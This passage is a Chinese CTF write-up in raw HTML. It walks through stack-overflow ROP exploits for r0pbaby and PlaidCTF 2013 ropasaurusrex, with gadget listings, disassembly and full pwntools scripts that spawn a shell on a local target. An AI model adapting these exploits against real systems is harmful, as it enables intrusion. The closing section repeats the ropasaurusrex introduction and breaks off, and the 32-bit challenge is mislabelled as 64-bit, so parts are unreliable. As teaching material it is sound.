+RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">gdb-peda 自带的 checksec 有检测程序是否开启保护，以及所开启的保护。我们可以看到，R0pbaby 所开启的保护有FORTIFY以及NX，这里我们主要所收到的限制是栈上写入的数据不可执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以及，程序可以知道是６４位的，它的传参优先由寄存器完成。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">尝试运行程序</span></strong></span></p><hr/><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t014d1024e19069ac4a.png" title="t0150c4a41c95e16adf.png" alt="http://p4.qhimg.com/t0150c4a41c95e16adf.png" style="text-align: center;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们去尝试运行，摸清了基本上的程序的功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">功能1，可以获得libc的基址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">功能2，可以获得函数的地址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">功能3，输入的地方，感觉这个地方可能存在漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">紧接着，我们可以用IDA 分析程序了。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01590f44261680b226.png" title="t015a959ab484d884ec.png" alt="http://p3.qhimg.com/t015a959ab484d884ec.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数原型</span></strong></span></p><hr/><pre class="brush:plain;toolbar:false">void&nbsp;memcpy(voiddest,&nbsp;const&nbsp;void&nbsp;*&nbsp;src,&nbsp;size_t&nbsp;n);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01c89def1b6b1db525.png" title="t01a5947a519a3807e7.png" alt="http://p8.qhimg.com/t01a5947a519a3807e7.png"/></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0104e92b7ce8297a2c.png" title="t0115aaded395ac0c75.png" alt="http://p7.qhimg.com/t0115aaded395ac0c75.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp;&nbsp;<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们需要找到一个gadget RDI 用来起shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其次我们需要找到 &quot;bin/sh&quot;的地址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后，我们需要找到system函数的地址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如何找到 pop rdi</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们需要找到:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">pop&nbsp;rdi
+ret</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如此的指令，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们可以通过简单的objdump来寻找简单的gadget</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">wings@sw:~/桌面/Rop$&nbsp;python&nbsp;ROPgadget.py&nbsp;--binary&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;--only&nbsp;&quot;pop|ret&quot;
+Gadgets&nbsp;information
+0x00000000000206c1&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;ret
+0x00000000000b5a23&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x000000000001fb11&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;ret
+0x000000000012bf16&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x0000000000020252&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;pop&nbsp;r15&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x00000000000210fe&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;pop&nbsp;r15&nbsp;;&nbsp;ret
+0x00000000000ccb05&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x00000000000202e6&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x000000000006d128&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x0000000000048438&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret
+0x000000000001f930&nbsp;:&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x00000000000ccb01&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x000000000006d124&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x00000000000398c5&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x00000000000202e1&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x00000000000206c0&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;ret
+0x00000000000b5a22&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x000000000001fb10&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;ret
+0x000000000012bf15&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x000000000001f92f&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x000000000002a69a&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret
+0x0000000000001b18&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret&nbsp;0x2a63
+0x0000000000185240&nbsp;:&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret&nbsp;0x6f9
+0x000000000013c01f&nbsp;:&nbsp;pop&nbsp;rcx&nbsp;;&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;ret
+0x000000000010134b&nbsp;:&nbsp;pop&nbsp;rcx&nbsp;;&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;pop&nbsp;r12&nbsp;;&nbsp;ret
+0x00000000000e9aba&nbsp;:&nbsp;pop&nbsp;rcx&nbsp;;&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret
+0x0000000000001b17&nbsp;:&nbsp;pop&nbsp;rcx&nbsp;;&nbsp;pop&nbsp;rbx&nbsp;;&nbsp;ret&nbsp;0x2a63
+0x00000000000fc3e2&nbsp;:&nbsp;pop&nbsp;rcx&nbsp;;&nbsp;ret
+0x0000000000020256&nbsp;:&nbsp;pop&nbsp;rdi&nbsp;;&nbsp;pop&nbsp;rbp&nbsp;;&nbsp;ret
+0x0000000000021102&nbsp;:&nbsp;pop&nbsp;rdi&nbsp;;&nbsp;ret</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因为是本地测试，所以我先查看自己本地的libc.so.6</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">确认libc.so.6</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:plain;toolbar:false">wings@sw:~/桌面/Rop$&nbsp;ldd&nbsp;r0pbaby
+&nbsp;&nbsp;&nbsp;&nbsp;linux-vdso.so.1&nbsp;=&gt;&nbsp;&nbsp;(0x00007ffff7ffd000)
+&nbsp;&nbsp;&nbsp;&nbsp;libdl.so.2&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libdl.so.2&nbsp;(0x00007ffff7bd9000)
+&nbsp;&nbsp;&nbsp;&nbsp;libc.so.6&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;(0x00007ffff7810000)
+&nbsp;&nbsp;&nbsp;&nbsp;/lib64/ld-linux-x86-64.so.2&nbsp;(0x0000555555554000)
+wings@sw:~/桌面/Rop$&nbsp;strings&nbsp;-a&nbsp;-tx&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;&quot;/bin/sh&quot;
+&nbsp;18c177&nbsp;/bin/sh</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以知道 偏移是0x18c177</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">system&nbsp;=&nbsp;0x00007FFFF784F390&nbsp;#get_libc_base()
+rdi_gadget_offset&nbsp;=&nbsp;0x21102
+bin_sh_offset&nbsp;=&nbsp;0x18c177
+system_offset&nbsp;=&nbsp;0x45390
+from&nbsp;pwn&nbsp;import&nbsp;*
+debug&nbsp;=1
+if&nbsp;debug&nbsp;==1:
+&nbsp;&nbsp;io&nbsp;=&nbsp;process(&quot;./r0pbaby&quot;)
+else:
+&nbsp;&nbsp;io&nbsp;=&nbsp;remote(&quot;127.0.0.1&quot;,10002)
+&nbsp;&nbsp;#db.attach(io)
+system&nbsp;=&nbsp;0x00007FFFF784F390#get_libc_base()
+rdi_gadget_offset&nbsp;=&nbsp;0x21102
+bin_sh_offset&nbsp;=&nbsp;0x18c177
+system_offset&nbsp;=&nbsp;0x45390
+libc_base&nbsp;=&nbsp;system&nbsp;-&nbsp;system_offset&nbsp;#&nbsp;system&nbsp;addr&nbsp;-&nbsp;system_offset&nbsp;=&nbsp;libc_base
+print&nbsp;&quot;[+]&nbsp;libc&nbsp;base:&nbsp;[%x]&quot;&nbsp;%&nbsp;libc_base
+rdi_gadget_addr&nbsp;=&nbsp;libc_base&nbsp;+&nbsp;rdi_gadget_offset
+print&nbsp;&quot;[+]&nbsp;RDI&nbsp;gadget&nbsp;addr:&nbsp;[%x]&quot;&nbsp;%&nbsp;rdi_gadget_addr
+bin_sh_addr&nbsp;=&nbsp;libc_base&nbsp;+&nbsp;bin_sh_offset
+print&nbsp;&quot;[+]&nbsp;\&quot;/bin/sh\&quot;&nbsp;addr:&nbsp;[%x]&quot;&nbsp;%&nbsp;bin_sh_addr
+system_addr&nbsp;=&nbsp;0x00007FFFF784F390#get_libc_func_addr(h,&nbsp;&quot;system&quot;)
+print&nbsp;&quot;[+]&nbsp;system&nbsp;addr:&nbsp;[%x]&quot;&nbsp;%&nbsp;system_addr
+payload&nbsp;=&nbsp;&quot;A&quot;*8
+payload&nbsp;+=&nbsp;p64(rdi_gadget_addr)
+payload&nbsp;+=&nbsp;p64(bin_sh_addr)
+payload&nbsp;+=&nbsp;p64(system_addr)
+io.recv(1024)
+io.sendline(&quot;3&quot;)
+io.recv(1024)
+io.send(&quot;%d\n&quot;%(len(payload)+1))
+io.sendline(payload)
+io.sendline(&quot;4&quot;)
+io.interactive()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PlaidCTF 2013: ropasaurusrex</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上一个程序简单的调用 system + &quot;bin/sh&quot; 通过寄存器 gadget &quot;pop rdi;ret &quot;传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">依旧是老三套，我们先分析一下程序开启的保护。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;checksec
+CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED
+PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;__cdecl&nbsp;main()
+{
+&nbsp;&nbsp;sub_80483F4();
+&nbsp;&nbsp;return&nbsp;write(1,&nbsp;&quot;WIN\n&quot;,&nbsp;4u);
+}
+sub_80483F4
+ssize_t&nbsp;sub_80483F4()
+{
+&nbsp;&nbsp;char&nbsp;buf;&nbsp;//&nbsp;[sp+10h]&nbsp;[bp-88h]@1
+&nbsp;&nbsp;return&nbsp;read(0,&nbsp;&amp;buf,&nbsp;0x100u);
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印WIN\n。紧接着，我们可以看到read函数被错误使用，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">.text:080483F2&nbsp;;&nbsp;---------------------------------------------------------------------------
+.text:080483F3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;align&nbsp;4
+.text:080483F4
+.text:080483F4&nbsp;;&nbsp;===============&nbsp;S&nbsp;U&nbsp;B&nbsp;R&nbsp;O&nbsp;U&nbsp;T&nbsp;I&nbsp;N&nbsp;E&nbsp;=======================================
+.text:080483F4
+.text:080483F4&nbsp;;&nbsp;Attributes:&nbsp;bp-based&nbsp;frame
+.text:080483F4
+.text:080483F4&nbsp;sub_80483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;main+9p
+.text:080483F4
+.text:080483F4&nbsp;buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;byte&nbsp;ptr&nbsp;-88h
+.text:080483F4
+.text:080483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp
+.text:080483F5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,&nbsp;esp
+.text:080483F7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,&nbsp;98h
+.text:080483FD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esp+8],&nbsp;100h&nbsp;;&nbsp;nbytes
+.text:08048405&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[ebp+buf]
+.text:0804840B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[esp+4],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;buf
+.text:0804840F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esp],&nbsp;0&nbsp;;&nbsp;fd
+.text:08048416&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;_read
+.text:0804841B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leave
+.text:0804841C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
+.text:0804841C&nbsp;sub_80483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endp
+.text:0804841C
+.text:0804841</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">wings@sw:~/桌面/Rop$&nbsp;file&nbsp;./ropasaurusrex
+./ropasaurusrex:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;dynamically&nbsp;linked,&nbsp;interpreter&nbsp;/lib/ld-linux.so.2,&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.18,&nbsp;BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092,&nbsp;stripped</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在main函数中有一个write函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">构造payload leak 内存中的一个函数地址，比如 read()</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">计算libc base</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">构造payload get shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+debug&nbsp;=&nbsp;1
+elf&nbsp;=&nbsp;ELF(&#39;./ropasaurusrex&#39;)
+if&nbsp;debug&nbsp;==&nbsp;1:
+&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+else:
+&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+bof&nbsp;=&nbsp;0x80483f4&nbsp;#&nbsp;the&nbsp;vulnerable&nbsp;function
+buffer_len&nbsp;=&nbsp;0x88
+context.log_level&nbsp;=&nbsp;&#39;debug&#39;
+#p&nbsp;=&nbsp;remote(args.host,&nbsp;args.port)
+#p&nbsp;=&nbsp;process(&#39;./ropasaurusrex&#39;)
+p&nbsp;=&nbsp;remote(&#39;127.0.0.1&#39;,10002)
+payload&nbsp;=&nbsp;&#39;&#39;
+payload&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;buffer_len
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;saved&nbsp;ebp
+payload&nbsp;+=&nbsp;p32(elf.symbols[&#39;write&#39;])
+payload&nbsp;+=&nbsp;p32(bof)
+payload&nbsp;+=&nbsp;p32(1)&nbsp;#&nbsp;stdout
+payload&nbsp;+=&nbsp;p32(elf.got[&#39;read&#39;])
+payload&nbsp;+=&nbsp;p32(4)&nbsp;#&nbsp;len
+p.send(payload)
+resp&nbsp;=&nbsp;p.recvn(4)
+read&nbsp;=&nbsp;u32(resp)
+libc_base&nbsp;=&nbsp;read&nbsp;-&nbsp;libc.symbols[&#39;read&#39;]
+payload&nbsp;=&nbsp;&#39;&#39;
+payload&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;buffer_len
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;saved&nbsp;ebp
+payload&nbsp;+=&nbsp;p32(libc_base&nbsp;+&nbsp;libc.symbols[&#39;system&#39;])
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;cont
+payload&nbsp;+=&nbsp;p32(libc_base&nbsp;+&nbsp;next(libc.search(&#39;/bin/sh&#39;)))
+p.send(payload)
+p.sendline(&#39;ls&#39;)
+p.interactive()</pre><p style="text-align:center"><img src="http://p3.qhimg.com/t01e7814784d24c499f.png" title="t0149e59bc671f3d500.png" alt="http://p5.qhimg.com/t0149e59bc671f3d500.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PlaidCTF 2013: ropasaurusrex</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上一个程序简单的调用 system + &quot;bin/sh&quot; 通过寄存器 gadget &quot;pop rdi;ret &quot;传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">依旧是老三套，我们先分析一下程序开启的保护。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;checksec
+CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;disabled
